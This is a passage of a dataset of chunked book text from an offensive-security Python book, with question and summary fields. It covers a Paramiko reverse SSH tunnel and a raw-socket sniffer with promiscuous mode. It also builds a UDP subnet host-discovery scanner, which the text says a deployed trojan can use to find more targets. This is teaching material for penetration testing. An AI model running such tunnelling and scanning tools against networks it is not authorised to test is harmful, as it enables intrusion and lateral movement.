stopped.')\nsys.exit(0)\nThe few lines at the top 1 double-check to make sure all the\nnecessary arguments are passed to the script before setting up the\nParamiko SSH client connection 2 (which should look very familiar).\nThe final section in calls the function\nmain() reverse_forward_tunnel\n3.\nLet’s have a look at that function:\ndef reverse_forward_tunnel(server_port, remote_host,\nremote_port, transport):\n1\ntransport.request_port_forward('', server_port)\nwhile True:\n2\nchan = transport.accept(1000)\nif chan is None:\ncontinue\n3\nthr = threading.Thread(\ntarget=handler, args=(chan, remote_host,\nremote_port)\n)\nthr.setDaemon(True)\nthr.start()\nIn Paramiko, there are two main communication methods:\n, which is responsible for making and maintaining the\ntransport\nencrypted connection, and , which acts like a socket for\nchannel\nsending and receiving data over the encrypted transport session.\nHere we start to use Paramiko’s to forward\nrequest_port_forward\nTCP connections from a port 1 on the SSH server and start up a new\ntransport channel 2. Then, over the channel, we call the function\nhandler 3.\nBut we’re not done yet. We need to code the function to\nhandler\nmanage the communication for each thread:\ndef handler(chan, host, port):\nsock = socket.socket()\ntry:\nsock.connect((host, port))\nexcept Exception as e:\nverbose('Forwarding request to %s:%d failed: %r' %\n(host, port, e))\nreturn\nverbose(\n'Connected! Tunnel open %r -> %r -> %r'\n% (chan.origin_addr, chan.getpeername(), (host,\nport))\n)\n1\nwhile True:\nr, w, x = select.select([sock, chan], [], [])\nif sock in r:\ndata = sock.recv(1024)\nif len(data) == 0:\nbreak\nchan.send(data)\nif chan in r:\ndata = chan.recv(1024)\nif len(data) == 0:\nbreak\nsock.send(data)\nchan.close()\nsock.close()\nverbose('Tunnel closed from %r' % (chan.origin_addr,))\nAnd finally, the data is sent and received 1. We give it a try in the\nnext section.\nKicking the Tires\nWe’ll run rforward.py from our Windows system and configure it to\nbe the middleman as we tunnel traffic from a web server to our Kali\nSSH server:\nC:\\Users\\tim> python rforward.py 192.168.1.203 -p 8081 -r\n192.168.1.207:3000 --user=tim --password\nEnter SSH password:\nConnecting to ssh host 192.168.1.203:22 . . .\nNow forwarding remote port 8081 to 192.168.1.207:3000 . . .\nYou can see that on the Windows machine, we made a connection\nto the SSH server at 192.168.1.203 and opened port 8081 on that\nserver, which will forward traffic to 192.168.1.207 port 3000. Now if\nwe browse to http://127.0.0.1:8081 on our Linux server, we connect\nto the web server at 192.168.1.207:3000 through the SSH tunnel, as\nshown in Figure 2-3.\nFigure 2-3: Reverse SSH tunnel example\nIf you flip back to the Windows machine, you can also see the\nconnection being made in Paramiko:\nConnected! Tunnel open ('127.0.0.1', 54690) ->\n('192.168.1.203', 22) -> ('192.168.1.207', 3000)\nSSH and SSH tunneling are important concepts to understand and\nuse. Black hats should know when and exactly how to use SSH and\nSSH tunneling, and Paramiko makes it possible to add SSH\ncapabilities to your existing Python tools.\nWe’ve created some very simple yet very useful tools in this\nchapter. We encourage you to expand and modify them as\nnecessary to develop a firm grasp on Python’s networking features.\nYou could use these tools during penetration tests, post-exploitation,\nor bug hunting. Let’s move on to using raw sockets and performing\nnetwork sniffing. Then we’ll combine the two to create a pure Python\nhost discovery scanner.",
    "question": "What is the purpose of using Python networking tools in the context of hacking and network attacks?",
    "summary": "This chapter introduces basic Python networking tools, focusing on the `socket` module for creating TCP and UDP clients and servers. It demonstrates how to build a Python-based netcat tool, a TCP proxy, and an SSH server using Paramiko, all of which can be used for hacking tasks without requiring other tools. The chapter also covers SSH tunneling for secure network communication and provides examples of how to use these tools for penetration testing and network discovery."
  },
  {
    "start": 25,
    "end": 39,
    "text": "3\nWRITING A SNIFFER\nNetwork sniffers allow you to see\npackets entering and exiting a target\nmachine. As a result, they have many\npractical uses before and after\nexploitation. In some cases, you’ll be\nable to use existing sniffing tools like\nWireshark (https://wireshark.org/) or a Pythonic\nsolution like Scapy (which we’ll explore in the next\nchapter). Nevertheless, there’s an advantage to\nknowing how to throw together your own quick sniffer\nto view and decode network traffic. Writing a tool like\nthis will also give you a deep appreciation for the\nmature tools, as these can painlessly take care of the\nfiner points with little effort on your part. You’ll also\nlikely pick up some new Python techniques and\nperhaps a better understanding of how the low-level\nnetworking bits work.\nIn the previous chapter, we covered how to send and receive data\nusing TCP and UDP. This is likely how you’ll interact with most\nnetwork services. But underneath these higher-level protocols are\nthe building blocks that determine how network packets are sent and\nreceived. You’ll use raw sockets to access lower-level networking\ninformation, such as the raw Internet Protocol (IP) and Internet\nControl Message Protocol (ICMP) headers. We won’t decode any\nEthernet information in this chapter, but if you intend to perform any\nlow-level attacks, such as ARP poisoning, or are developing wireless\nassessment tools, you should become intimately familiar with\nEthernet frames and their use.\nLet’s begin with a brief walk-through of how to discover active\nhosts on a network segment.\nBuilding a UDP Host Discovery Tool\nOur sniffer’s main goal is to discover hosts on a target network.\nAttackers want to be able to see all of the potential targets on a\nnetwork so that they can focus their reconnaissance and exploitation\nattempts.\nWe’ll use a known behavior of most operating systems to\ndetermine if there is an active host at a particular IP address. When\nwe send a UDP datagram to a closed port on a host, that host\ntypically sends back an ICMP message indicating that the port is\nunreachable. This ICMP message tells us that there is a host alive,\nbecause if there was no host, we probably wouldn’t receive any\nresponse to the UDP datagram. It’s essential, therefore, that we pick\na UDP port that won’t likely be used. For maximum coverage, we\ncan probe several ports to ensure we aren’t hitting an active UDP\nservice.\nWhy the User Datagram Protocol? Well, there’s no overhead in\nspraying the message across an entire subnet and waiting for the\nICMP responses to arrive accordingly. This is quite a simple scanner\nto build, as most of the work goes into decoding and analyzing the\nvarious network protocol headers. We’ll implement this host scanner\nfor both Windows and Linux to maximize the likelihood of being able\nto use it inside an enterprise environment.\nWe could also build additional logic into our scanner to kick off full\nNmap port scans on any hosts we discover. That way, we can\ndetermine if they have a viable network attack surface. This is an\nexercise left for the reader, and we the authors look forward to\nhearing some of the creative ways you can expand this core\nconcept. Let’s get started.\nPacket Sniffing on Windows and Linux\nThe process of accessing raw sockets in Windows is slightly different\nthan on its Linux brethren, but we want the flexibility to deploy the\nsame sniffer to multiple platforms. To account for this, we’ll create a\nsocket object and then determine which platform we’re running on.\nWindows requires us to set some additional flags through a socket\ninput/output control (IOCTL), which enables promiscuous mode on\nthe network interface An input/output control (IOCTL) is a means for\nuser space programs to communicate with kernel mode\ncomponents. Have a read here: http://en.wikipedia.org/wiki/Ioctl.\nIn our first example, we simply set up our raw socket sniffer, read\nin a single packet, and then quit:\nimport socket\nimport os\n# host to listen on\nHOST = '192.168.1.203'\ndef main():\n# create raw socket, bin to public interface\nif os.name == 'nt':\nsocket_protocol = socket.IPPROTO_IP\nelse:\nsocket_protocol = socket.IPPROTO_ICMP\n1\nsniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW,\nsocket_protocol)\nsniffer.bind((HOST, 0))\n# include the IP header in the capture\n2\nsniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL,\n1)\n3\nif os.name == 'nt':\nsniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)\n# read one packet\n4\nprint(sniffer.recvfrom(65565))\n# if we're on Windows, turn off promiscuous mode\n5\nif os.name == 'nt':\nsniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)\nif __name__ == '__main__':\nmain()\nWe start by defining the IP to our own machine’s address and\nHOST\nconstructing our socket object with the parameters necessary for\nsniffing packets on our network interface 1. The difference between\nWindows and Linux is that Windows will allow us to sniff all incoming\npackets regardless of protocol, whereas Linux forces us to specify\nthat we are sniffing ICMP packets. Note that we are using\npromiscuous mode, which requires administrative privileges on\nWindows or root on Linux. Promiscuous mode allows us to sniff all\npackets that the network card sees, even those not destined for our\nspecific host. Then we set a socket option 2 that includes the IP\nheaders in our captured packets. The next step 3 is to determine if\nwe are using Windows and, if so, perform the additional step of\nsending an IOCTL to the network card driver to enable promiscuous\nmode. If you’re running Windows in a virtual machine, you will likely\nget a notification that the guest operating system is enabling\npromiscuous mode; you, of course, will allow it. Now we are ready to\nactually perform some sniffing, and in this case we are simply\nprinting out the entire raw packet 4 with no packet decoding. This is\njust to make sure we have the core of our sniffing code working.\nAfter a single packet is sniffed, we again test for Windows and then\ndisable promiscuous mode 5 before exiting the script.\nKicking the Tires\nOpen up a fresh terminal or cmd.exe shell under Windows and run\nthe following:\npython sniffer.py\nIn another terminal or shell window, you pick a host to ping. Here,\nwe’ll ping nostarch.com:\nping nostarch.com\nIn your first window, where you executed your sniffer, you should\nsee some garbled output that closely resembles the following:\n(b'E\\x00\\x00T\\xad\\xcc\\x00\\x00\\x80\\x01\\n\\x17h\\x14\\xd1\\x03\\xac\\\nx10\\x9d\\x9d\\x00\\\nx00g,\\rv\\x00\\x01\\xb6L\\x1b^\\x00\\x00\\x00\\x00\\xf1\\xde\\t\\x00\\x00\\\nx00\\x00\\x00\\x10\\\nx11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\n!\"#$%&\\'()*+,-./01234567', ('104.20.209.3', 0))\nYou can see that we’ve captured the initial ICMP ping request\ndestined for nostarch.com (based on the appearance of the IP for\nnostarch.com, 104.20.209.3, at the end of the output). If you are\nrunning this example on Linux, you would receive the response from\nnostarch.com.\nSniffing one packet is not overly useful, so let’s add some\nfunctionality to process more packets and decode their contents.\nDecoding the IP Layer\nIn its current form, our sniffer receives all of the IP headers, along\nwith any higher protocols such as TCP, UDP, or ICMP. The\ninformation is packed into binary form and, as shown previously, is\nquite difficult to understand. Let’s work on decoding the IP portion of\na packet so that we can pull useful information from it, such as the\nprotocol type (TCP, UDP, or ICMP) and the source and destination IP\naddresses. This will serve as a foundation for further protocol\nparsing later on.\nIf we examine what an actual packet looks like on the network, you\nshould understand how we need to decode the incoming packets.\nRefer to Figure 3-1 for the makeup of an IP header.\nFigure 3-1: Typical IPv4 header structure\nWe will decode the entire IP header (except the Options field) and\nextract the protocol type, source, and destination IP address. This\nmeans we’ll be working directly with the binary, and we’ll have to\ncome up with a strategy for separating each part of the IP header\nusing Python.\nIn Python, there are a couple of ways to get external binary data\ninto a data structure. You can use either the module or the\nctypes\nmodule to define the data structure. The module is a\nstruct ctypes\nforeign function library for Python. It provides a bridge to C-based\nlanguages, enabling you to use C-compatible data types and call\nfunctions in shared libraries. On the other hand, converts\nstruct\nbetween Python values and C structs represented as Python byte\nobjects. In other words, the module handles binary data types\nctypes\nin addition to providing a lot of other functionality, while the\nstruct\nmodule primarily handles binary data.\nYou will see both methods used when you explore tool repositories\non the web. This section shows you how to use each one to read an\nIPv4 header off the network. It’s up to you to decide which method\nyou prefer; either will work fine.\nThe ctypes Module\nThe following code snippet defines a new class, , that can read a\nIP\npacket and parse the header into its separate fields:\nfrom ctypes import *\nimport socket\nimport struct\nclass IP(Structure):\n_fields_ = [\n(\"ihl\", c_ubyte, 4), # 4 bit\nunsigned char\n(\"version\", c_ubyte, 4), # 4 bit\nunsigned char\n(\"tos\", c_ubyte, 8), # 1 byte char\n(\"len\", c_ushort, 16), # 2 byte\nunsigned short\n(\"id\", c_ushort, 16), # 2 byte\nunsigned short\n(\"offset\", c_ushort, 16), # 2 byte\nunsigned short\n(\"ttl\", c_ubyte, 8), # 1 byte char\n(\"protocol_num\", c_ubyte, 8), # 1 byte char\n(\"sum\", c_ushort, 16), # 2 byte\nunsigned short\n(\"src\", c_uint32, 32), # 4 byte\nunsigned int\n(\"dst\", c_uint32, 32) # 4 byte\nunsigned int\n]\ndef __new__(cls, socket_buffer=None):\nreturn cls.from_buffer_copy(socket_buffer)\ndef __init__(self, socket_buffer=None):\n# human readable IP addresses\nself.src_address = socket.inet_ntoa(struct.pack(\"\n<L\",self.src))\nself.dst_address = socket.inet_ntoa(struct.pack(\"\n<L\",self.dst))\nThis class creates a structure to define each part of the\n_fields_\nIP header. The structure uses C types that are defined in the\nctypes\nmodule. For example, the type is an unsigned char, the\nc_ubyte\ntype is an unsigned short, and so on. You can see that\nc_ushort\neach field matches the IP header diagram in Figure 3-1. Each field\ndescription takes three arguments: the name of the field (such as\nihl\nor ), the type of value it takes (such as or ),\noffset c_ubyte c_ushort\nand the width in bits for that field (such as 4 for and ).\nihl version\nBeing able to specify the bit width is handy because it provides the\nfreedom to specify any length we need, not only at the byte level\n(specification at the byte level would force our defined fields to\nalways be a multiple of 8 bits).\nThe class inherits from the module’s class,\nIP ctypes Structure\nwhich specifies that we must have a defined structure\n_fields_\nbefore creating any object. To fill the structure, the\n_fields_\nclass uses the method, which takes the class\nStructure __new__\nreference as the first argument. It creates and returns an object of\nthe class, which passes to the method. When we create our\n__init__\nIP object, we’ll do so as we ordinarily would, but underneath, Python\ninvokes , which fills out the data structure\n__new__ _fields_\nimmediately before the object is created (when the method\n__init__\nis called). As long as you’ve defined the structure beforehand, you\ncan just pass the method the external network packet data,\n__new__\nand the fields should magically appear as your object’s attributes.\nYou now have an idea of how to map the C data types to the IP\nheader values. Using C code as a reference when translating to\nPython objects can be useful, because the conversion to pure\nPython is seamless. See the documentation for full details\nctypes\nabout working with this module.\nThe struct Module\nThe module provides format characters that you can use to\nstruct\nspecify the structure of the binary data. In the following example,\nwe’ll once again define an class to hold the header information.\nIP\nThis time, though, we’ll use format characters to represent the parts\nof the header:\nimport ipaddress\nimport struct\nclass IP:\ndef __init__(self, buff=None):\nheader = struct.unpack('<BBHHHBBH4s4s', buff)\n1\nself.ver = header[0] >> 4\n2\nself.ihl = header[0] & 0xF\nself.tos = header[1]\nself.len = header[2]\nself.id = header[3]\nself.offset = header[4]\nself.ttl = header[5]\nself.protocol_num = header[6]\nself.sum = header[7]\nself.src = header[8]\nself.dst = header[9]\n# human readable IP addresses\nself.src_address = ipaddress.ip_address(self.src)\nself.dst_address = ipaddress.ip_address(self.dst)\n# map protocol constants to their names\nself.protocol_map = {1: \"ICMP\", 6: \"TCP\", 17: \"UDP\"}\nThe first format character (in our case, <) always specifies the\nendianness of the data, or the order of bytes within a binary number.\nC types are represented in the machine’s native format and byte\norder. In this case, we’re on Kali (x64), which is little-endian. In a\nlittle-endian machine, the least significant byte is stored in the lower\naddress, and the most significant byte in the highest address.\nThe next format characters represent the individual parts of the\nheader. The module provides several format characters. For\nstruct\nthe IP header, we need only the format characters (1-byte\nB\nunsigned char), (2-byte unsigned short), and (a byte array that\nH s\nrequires a byte-width specification; means a 4-byte string). Note\n4s\nhow our format string matches the structure of the IP header\ndiagram in Figure 3-1.\nRemember that with , we could specify the bit-width of the\nctypes\nindividual header parts. With , there’s no format character for\nstruct\na nybble (a 4-bit unit of data, also known as a nibble), so we have to\ndo some manipulation to get the and variables from the\nver hdrlen\nfirst part of the header.\nOf the first byte of header data we receive, we want to assign the\nvariable only the high-order nybble (the first nybble in the byte).\nver\nThe typical way you get the high-order nybble of a byte is to right-\nshift the byte by four places, which is the equivalent of prepending\nfour 0s to the front of the byte, causing the last 4 bits to fall off 1.\nThis leaves us with only the first nybble of the original byte. The\nPython code essentially does the following:\n0 1 0 1 0 1 1 0 >> 4\n-----------------------------\n0 0 0 0 0 1 0 1\nWe want to assign the variable the low-order nybble, or the\nhdrlen\nlast 4 bits of the byte. The typical way to get the second nybble of a\nbyte is to use the Boolean operator with 0xF (00001111) 2. This\nAND\napplies the Boolean operation such that 0 1 produce 0 (since 0 is\nAND\nequivalent to , and 1 is equivalent to ). For the expression\nFALSE TRUE\nto be true, both the first part and the last part must be true.\nTherefore, this operation deletes the first 4 bits, as anything ed\nAND\nwith 0 will be 0. It leaves the last 4 bits unaltered, as anything ed\nAND\nwith 1 will return the original value. Essentially, the Python code\nmanipulates the byte as follows:\n0 1 0 1 0 1 1 0\nAND 0 0 0 0 1 1 1 1\n-----------------------------\n0 0 0 0 0 1 1 0\nYou don’t have to know very much about binary manipulation to\ndecode an IP header, but you’ll see certain patterns, like using shifts\nand over and over as you explore other hackers’ code, so it’s\nAND\nworth understanding those techniques.\nIn cases like this that require some bit-shifting, decoding binary\ndata takes some effort. But for many cases (such as reading ICMP\nmessages), it’s very simple to set up: each portion of the ICMP\nmessage is a multiple of 8 bits, and the format characters provided\nby the module are multiples of 8 bits, so there’s no need to\nstruct\nsplit a byte into separate nybbles. In the Echo Reply ICMP message\nshown in Figure 3-2, you can see that each parameter of the ICMP\nheader can be defined in a struct with one of the existing format\nletters ( ).\nBBHHH\nFigure 3-2: Sample Echo Reply ICMP message\nA quick way to parse this message would be to simply assign 1\nbyte to the first two attributes and 2 bytes to the next three attributes:\nclass ICMP:\ndef __init__(self, buff):\nheader = struct.unpack('<BBHHH', buff)\nself.type = header[0]\nself.code = header[1]\nself.sum = header[2]\nself.id = header[3]\nself.seq = header[4]\nRead the documentation\nstruct\n(https://docs.python.org/3/library/struct.html) for full details about\nusing this module.\nYou can use either the module or the module to\nctypes struct\nread and parse binary data. No matter which approach you take,\nyou’ll instantiate the class like this:\nmypacket = IP(buff)\nprint(f'{mypacket.src_address} ->\n{mypacket.dst_address}')\nIn this example, you instantiate the IP class with your packet data\nin the variable .\nbuff\nWriting the IP Decoder\nLet’s implement the IP decoding routine we just created into a file\ncalled sniffer_ip_header_decode.py, as shown here:\nimport ipaddress\nimport os\nimport socket\nimport struct\nimport sys\n1\nclass IP:\ndef __init__(self, buff=None):\nheader = struct.unpack('<BBHHHBBH4s4s', buff)\nself.ver = header[0] >> 4\nself.ihl = header[0] & 0xF\nself.tos = header[1]\nself.len = header[2]\nself.id = header[3]\nself.offset = header[4]\nself.ttl = header[5]\nself.protocol_num = header[6]\nself.sum = header[7]\nself.src = header[8]\nself.dst = header[9]\n2\n# human readable IP addresses\nself.src_address = ipaddress.ip_address(self.src)\nself.dst_address = ipaddress.ip_address(self.dst)\n# map protocol constants to their names\nself.protocol_map = {1: \"ICMP\", 6: \"TCP\", 17: \"UDP\"}\ntry:\nself.protocol =\nself.protocol_map[self.protocol_num]\nexcept Exception as e:\nprint('%s No protocol for %s' % (e,\nself.protocol_num))\nself.protocol = str(self.protocol_num)\ndef sniff(host):\n# should look familiar from previous example\nif os.name == 'nt':\nsocket_protocol = socket.IPPROTO_IP\nelse:\nsocket_protocol = socket.IPPROTO_ICMP\nsniffer = socket.socket(socket.AF_INET,\nsocket.SOCK_RAW,\nsocket_protocol)\nsniffer.bind((host, 0))\nsniffer.setsockopt(socket.IPPROTO_IP,\nsocket.IP_HDRINCL, 1)\nif os.name == 'nt':\nsniffer.ioctl(socket.SIO_RCVALL,\nsocket.RCVALL_ON)\ntry:\nwhile True:\n# read a packet\n3\nraw_buffer = sniffer.recvfrom(65535)[0]\n# create an IP header from the first 20 bytes\n4\nip_header = IP(raw_buffer[0:20])\n# print the detected protocol and hosts\n5\nprint('Protocol: %s %s -> %s' %\n(ip_header.protocol,\nip_header.src_address,\nip_header.dst_address))\nexcept KeyboardInterrupt:\n# if we're on Windows, turn off promiscuous mode\nif os.name == 'nt':\nsniffer.ioctl(socket.SIO_RCVALL,\nsocket.RCVALL_OFF)\nsys.exit()\nif __name__ == '__main__':\nif len(sys.argv) == 2:\nhost = sys.argv[1]\nelse:\nhost = '192.168.1.203'\nsniff(host)\nFirst, we include our class definition 1, which defines a Python\nIP\nstructure that will map the first 20 bytes of the received buffer into a\nfriendly IP header. As you can see, all of the fields that we identified\nmatch up nicely with the header structure. We do some\nhousekeeping to produce some human-readable output that\nindicates the protocol in use and the IP addresses involved in the\nconnection 2. With our freshly minted structure, we now write the\nIP\nlogic to continually read in packets and parse their information. We\nread in the packet 3 and then pass the first 20 bytes 4 to initialize our\nstructure. Next, we simply print out the information that we have\nIP\ncaptured 5. Let’s try it out.\nKicking the Tires\nLet’s test out our previous code to see what kind of information we\nare extracting from the raw packets being sent. We definitely\nrecommend that you do this test from your Windows machine, as\nyou will be able to see TCP, UDP, and ICMP, which allows you to do\nsome pretty neat testing (opening up a browser, for example). If you\nare confined to Linux, then perform the previous ping test to see it in\naction.\nOpen a terminal and type the following:\npython sniffer_ip_header_decode.py\nNow, because Windows is pretty chatty, you’re likely to see output\nimmediately. The authors tested this script by opening Internet\nExplorer and going to www.google.com, and here is the output from\nour script:\nProtocol: UDP 192.168.0.190 -> 192.168.0.1\nProtocol: UDP 192.168.0.1 -> 192.168.0.190\nProtocol: UDP 192.168.0.190 -> 192.168.0.187\nProtocol: TCP 192.168.0.187 -> 74.125.225.183\nProtocol: TCP 192.168.0.187 -> 74.125.225.183\nProtocol: TCP 74.125.225.183 -> 192.168.0.187\nProtocol: TCP 192.168.0.187 -> 74.125.225.183\nBecause we aren’t doing any deep inspection on these packets,\nwe can only guess what this stream is indicating. Our guess is that\nthe first couple of UDP packets are the Domain Name System (DNS)\nqueries to determine where google.com lives, and the subsequent\nTCP sessions are our machine actually connecting and downloading\ncontent from their web server.\nTo perform the same test on Linux, we can ping google.com, and\nthe results will look something like this:\nProtocol: ICMP 74.125.226.78 -> 192.168.0.190\nProtocol: ICMP 74.125.226.78 -> 192.168.0.190\nProtocol: ICMP 74.125.226.78 -> 192.168.0.190\nYou can already see the limitation: we are seeing only the\nresponse and only for the ICMP protocol. But because we are\npurposefully building a host discovery scanner, this is completely\nacceptable. We will now apply the same techniques we used to\ndecode the IP header to decode the ICMP messages.\nDecoding ICMP\nNow that we can fully decode the IP layer of any sniffed packets, we\nhave to be able to decode the ICMP responses that our scanner will\nelicit from sending UDP datagrams to closed ports. ICMP messages\ncan vary greatly in their contents, but each message contains three\nelements that stay consistent: the type, code, and checksum fields.\nThe type and code fields tell the receiving host what type of ICMP\nmessage is arriving, which then dictates how to decode it properly.\nFor the purpose of our scanner, we are looking for a type value of\n3 and a code value of 3. This corresponds to the\nDestination\nclass of ICMP messages, and the code value of 3\nUnreachable\nindicates that the error has been caused. Refer to\nPort Unreachable\nFigure 3-3 for a diagram of a ICMP\nDestination Unreachable\nmessage.\nFigure 3-3: Diagram of Destination Unreachable ICMP message\nAs you can see, the first 8 bits are the type, and the second 8 bits\ncontain our ICMP code. One interesting thing to note is that when a\nhost sends one of these ICMP messages, it actually includes the IP\nheader of the originating message that generated the response. We\ncan also see that we will double-check against 8 bytes of the original\ndatagram that was sent in order to make sure our scanner generated\nthe ICMP response. To do so, we simply slice off the last 8 bytes of\nthe received buffer to pull out the magic string that our scanner\nsends.\nLet’s add some more code to our previous sniffer to include the\nability to decode ICMP packets. Let’s save our previous file as\nsniffer_with_icmp.py and add the following code:\nimport ipaddress\nimport os\nimport socket\nimport struct\nimport sys\nclass IP:\n--snip--\n1\nclass ICMP:\ndef __init__(self, buff):\nheader = struct.unpack('<BBHHH', buff)\nself.type = header[0]\nself.code = header[1]\nself.sum = header[2]\nself.id = header[3]\nself.seq = header[4]\ndef sniff(host):\n--snip--\nip_header = IP(raw_buffer[0:20])\n# if it's ICMP, we want it\n2\nif ip_header.protocol == \"ICMP\":\nprint('Protocol: %s %s -> %s' %\n(ip_header.protocol,\nip_header.src_address,\nip_header.dst_address))\nprint(f'Version: {ip_header.ver}')\nprint(f'Header Length: {ip_header.ihl} TTL:\n{ip_header.ttl}')\n# calculate where our ICMP packet starts\n3\noffset = ip_header.ihl * 4\nbuf = raw_buffer[offset:offset + 8]\n# create our ICMP structure\n4\nicmp_header = ICMP(buf)\nprint('ICMP -> Type: %s Code: %s\\n' %\n(icmp_header.type, icmp_header.code))\nexcept KeyboardInterrupt:\nif os.name == 'nt':\nsniffer.ioctl(socket.SIO_RCVALL,\nsocket.RCVALL_OFF)\nsys.exit()\nif __name__ == '__main__':\nif len(sys.argv) == 2:\nhost = sys.argv[1]\nelse:\nhost = '192.168.1.203'\nsniff(host)\nThis simple piece of code creates an structure 1 underneath\nICMP\nour existing structure. When the main packet-receiving loop\nIP\ndetermines that we have received an ICMP packet 2, we calculate\nthe offset in the raw packet where the ICMP body lives 3 and then\ncreate our buffer 4 and print out the and fields. The length\ntype code\ncalculation is based on the IP header field, which indicates the\nihl\nnumber of 32-bit words (4-byte chunks) contained in the IP header.\nSo by multiplying this field by 4, we know the size of the IP header\nand thus when the next network layer (ICMP in this case) begins.\nIf we quickly run this code with our typical ping test, our output\nshould now be slightly different:\nProtocol: ICMP 74.125.226.78 -> 192.168.0.190\nICMP -> Type: 0 Code: 0\nThis indicates that the ping (ICMP Echo) responses are being\ncorrectly received and decoded. We are now ready to implement the\nlast bit of logic to send out the UDP datagrams and to interpret their\nresults.\nNow let’s add the use of the module so that we can\nipaddress\ncover an entire subnet with our host discovery scan. Save your\nsniffer_with_icmp.py script as scanner.py and add the following\ncode:\nimport ipaddress\nimport os\nimport socket\nimport struct\nimport sys\nimport threading\nimport time\n# subnet to target\nSUBNET = '192.168.1.0/24'\n# magic string we'll check ICMP responses for\n1\nMESSAGE = 'PYTHONRULES!'\nclass IP:\n--snip--\nclass ICMP:\n--snip--\n# this sprays out UDP datagrams with our magic message\n2\ndef udp_sender():\nwith socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as\nsender:\nfor ip in ipaddress.ip_network(SUBNET).hosts():\nsender.sendto(bytes(MESSAGE, 'utf8'), (str(ip),\n65212))\n3\nclass Scanner:\ndef __init__(self, host):\nself.host = host\nif os.name == 'nt':\nsocket_protocol = socket.IPPROTO_IP\nelse:\nsocket_protocol = socket.IPPROTO_ICMP\nself.socket = socket.socket(socket.AF_INET,\nsocket.SOCK_RAW,\nsocket_protocol)\nself.socket.bind((host, 0))\nself.socket.setsockopt(socket.IPPROTO_IP,\nsocket.IP_HDRINCL, 1)\nif os.name == 'nt':\nself.socket.ioctl(socket.SIO_RCVALL,\nsocket.RCVALL_ON)\n4\ndef sniff(self):\nhosts_up = set([f'{str(self.host)} *'])\ntry:\nwhile True:\n# read a packet\nraw_buffer = self.socket.recvfrom(65535)[0]\n# create an IP header from the first 20 bytes\nip_header = IP(raw_buffer[0:20])\n# if it's ICMP, we want it\nif ip_header.protocol == \"ICMP\":\noffset = ip_header.ihl * 4\nbuf = raw_buffer[offset:offset + 8]\nicmp_header = ICMP(buf)\n# check for TYPE 3 and CODE\nif icmp_header.code == 3 and\nicmp_header.type == 3:\nif\n5\nipaddress.ip_address(ip_header.src_address) in\nipaddress.IPv4Network(SUBNET):\n# make sure it has our magic\nmessage\nif raw_buffer[len(raw_buffer) -\n6\nlen(MESSAGE):] ==\nbytes(MESSAGE,\n'utf8'):\ntgt =\nstr(ip_header.src_address)\nif tgt != self.host and tgt\nnot in hosts_up:\nhosts_up.add(str(ip_header.src_address))\nprint(f'Host Up: {tgt}')\n7\n# handle CTRL-C\n8\nexcept KeyboardInterrupt:\nif os.name == 'nt':\nself.socket.ioctl(socket.SIO_RCVALL,\nsocket.RCVALL_OFF)\nprint('\\nUser interrupted.')\nif hosts_up:\nprint(f'\\n\\nSummary: Hosts up on {SUBNET}')\nfor host in sorted(hosts_up):\nprint(f'{host}')\nprint('')\nsys.exit()\nif __name__ == '__main__':\nif len(sys.argv) == 2:\nhost = sys.argv[1]\nelse:\nhost = '192.168.1.203'\ns = Scanner(host)\ntime.sleep(5)\n9\nt = threading.Thread(target=udp_sender)\nt.start()\ns.sniff()\nThis last bit of code should be fairly straightforward to understand.\nWe define a simple string signature 1 so that we can test that the\nresponses are coming from UDP packets that we sent originally. Our\nfunction 2 simply takes in a subnet that we specify at the\nudp_sender\ntop of our script, iterates through all IP addresses in that subnet, and\nfires UDP datagrams at them.\nWe then define a class 3. To initialize it, we pass it a host\nScanner\nas an argument. As it initializes, we create a socket, turn on\npromiscuous mode if running Windows, and make the socket an\nattribute of the class.\nScanner\nThe method 4 sniffs the network, following the same steps\nsniff\nas in the previous example, except that this time it keeps a record of\nwhich hosts are up. If we detect the anticipated ICMP message, we\nfirst check to make sure that the ICMP response is coming from\nwithin our target subnet 5. We then perform our final check of\nmaking sure that the ICMP response has our magic string in it 6. If\nall of these checks pass, we print out the IP address of the host\nwhere the ICMP message originated 7. When we end the sniffing\nprocess by using CTRL-C, we handle the keyboard interrupt 8. That\nis, we turn off promiscuous mode if on Windows and print out a\nsorted list of live hosts.\nThe block does the work of setting things up: it creates\n__main__\nthe object, sleeps just a few seconds, and then, before\nScanner\ncalling the method, spawns in a separate thread 9\nsniff udp_sender\nto ensure that we aren’t interfering with our ability to sniff responses.\nLet’s try it out.\nKicking the Tires\nNow let’s take our scanner and run it against the local network. You\ncan use Linux or Windows for this, as the results will be the same. In\nthe authors’ case, the IP address of the local machine we were on\nwas 192.168.0.187, so we set our scanner to hit 192.168.0.0/24. If\nthe output is too noisy when you run your scanner, simply comment\nout all print statements except for the last one that tells you what\nhosts are responding.\npython.exe scanner.py\nHost Up: 192.168.0.1\nHost Up: 192.168.0.190\nHost Up: 192.168.0.192\nHost Up: 192.168.0.195\nTHE IPADDRESS MODULE\nOur scanner will use a library called ipaddress, which will allow us to feed in a\nsubnet mask such as 192.168.0.0/24 and have our scanner handle it\nappropriately.\nThe ipaddress module makes working with subnets and addressing very\neasy. For example, you can run simple tests like the following using the\nIpv4Network object:\nip_address = \"192.168.112.3\"\nif ip_address in Ipv4Network(\"192.168.112.0/24\"):\nprint True\nOr you can create simple iterators if you want to send packets to an entire\nnetwork:\nfor ip in Ipv4Network(\"192.168.112.1/24\"):\ns = socket.socket()\ns.connect((ip, 25))\n# send mail packets\nThis will greatly simplify your programming life when dealing with entire\nnetworks at a time, and it is ideally suited for our host discovery tool.\nFor a quick scan like the one we performed, it took only a few\nseconds to get the results. By cross-referencing these IP addresses\nwith the DHCP table in a home router, we were able to verify that the\nresults were accurate. You can easily expand what you’ve learned in\nthis chapter to decode TCP and UDP packets as well as to build\nadditional tooling around the scanner. This scanner is also useful for\nthe trojan framework we will begin building in Chapter 7. This would\nallow a deployed trojan to scan the local network for additional\ntargets.\nNow that you know the basics of how networks work on a high and\nlow level, let’s explore a very mature Python library called Scapy.\n4\nOWNING THE NETWORK WITH\nSCAPY\nOccasionally, you run into such a well-\nthought-out, amazing Python library that\neven dedicating a whole chapter to it\ncan’t do it justice. Philippe Biondi has\ncreated such a library in the 